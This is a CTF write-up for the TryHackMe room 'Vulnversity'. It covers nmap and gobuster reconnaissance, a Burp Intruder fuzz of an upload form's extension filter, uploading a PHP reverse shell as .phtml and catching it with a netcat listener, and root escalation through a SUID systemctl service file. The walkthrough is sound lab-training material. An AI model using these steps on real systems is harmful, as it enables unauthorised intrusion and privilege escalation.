---
title: Writeup for TryHackMe room - Vulnversity
author: 4n3i5v74
date: 2021-01-17 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, web]
pin: true
---

## [Vulnversity](https://tryhackme.com/room/vulnversity){:target="_blank"}

This room is about performing recon and web attacks.


## Task 2 - Reconnaisance

Use these links as references.
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Using `nmap` as below, all info can be gathered for the task.
{% capture code %}nmap -Pn -T4 -sV --reason --open <ip>{% endcapture %} {% include code.html code=code lang="bash"%}


## Task 3 - Locating directories using Gobuster

Use these links as references.
- [Gobuster Reference](https://4n3i5v74.github.io/posts/cheatsheet-gobuster/){:target="_blank"}
- [Wordlist Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#wordlists---rockyou){:target="_blank"}


Using `gobuster` and `dirb` wordlists, find the child directories under web root.
{% capture code %}gobuster dir -u http://<ip>:3333 -w /usr/share/wordlists/dirb/common.txt -q{% endcapture %} {% include code.html code=code lang="bash"%}

Use either `curl` or browser to load the pages from `gobuster` result and see if anything contains `upload` logic.
{% capture code %}curl http://<ip>:3333/<dir>/{% endcapture %} {% include code.html code=code lang="bash"%}


## Task 4 - Compromise the webserver

Use these links as references.
- [Burpsuite Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-burpsuite){:target="_blank"}


This task can be done using `burpsuite`.
- Open `firefox` and set proxy `127.0.0.1:8080`
- Open `burpsuite` and turn `intercept on`
- Using the url previously found for uploading files, load the url `http://<ip>:3333/<dir>/` in `firefox` and upload a file
- In `burpsuite`, in `proxy` tab, select the content and `send to intruder`
- In `burpsuite`, in `intruder` tab, and in `positions` tab, select `sniper` attack type, `clear §`, and `add §` to filename extension
- In `burpsuite`, in `intruder` tab, and in `payloads` tab, load `/usr/share/wordlists/SecLists/Fuzzing/extensions-m1ost-common.fuzz.txt` and `start attack`
- Check the results for different response size to find which extensions are not blocked
- Quit `burpsuite` and reverse proxy setting in `firefox`

Download the [php reverse shell payload](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php){:target="_blank"},and copy the file under extension `.phtml`. Edit the file and and change ip to local machine ip.

Start a netcat session to listen for reverse proxy connection.
{% capture code %}nc -lnvp 1234{% endcapture %} {% include code.html code=code lang="bash"%}

Using the url previously found for uploading files, load the url `http://<ip>:3333/<dir>/` in `firefox` and upload payload file, and navigate to the url `http://<ip>:3333/<dir>/uploads/php-reverse-shell.phtml`. A reverse shell should have been created in the `netcat` listening terminal.

The `user` managing the web server and the `flag` can be retrieved from the shell.


## Task 5 - Privilege Escalation

Now the webserver is compromised and a shell access is gained. This task shows how to gain privilege escalation using `SUID`.

Find the commands which has `SUID` set. This allows normal user to gain root access temporarily. Any of the below command can be used to find the binaries allowing `SUID`.
{% capture code %}find / -perm /4000 2>&1 | grep -v “Permission denied”{% endcapture %} {% include code.html code=code lang="bash"%}
{% capture code %}find / -user root -perm -4000 -exec ls -ldb {} \;{% endcapture %} {% include code.html code=code lang="bash"%}

Since the binary found is `/bin/systemctl`, create a temporary `service file`, and run it, to gain `SUID` access.
{% capture code %}eop=$(mktemp).service{% endcapture %} {% include code.html code=code lang="bash"%}

{% capture code %}echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $eop{% endcapture %} {% include code.html code=code lang="bash"%}

{% capture code %}/bin/systemctl link $eop{% endcapture %} {% include code.html code=code lang="bash"%}

{% capture code %}/bin/systemctl enable --now $eop{% endcapture %} {% include code.html code=code lang="bash"%}


Capture the flag from the manipulated output file.
{% capture code %}cat /tmp/output{% endcapture %} {% include code.html code=code lang="bash"%}
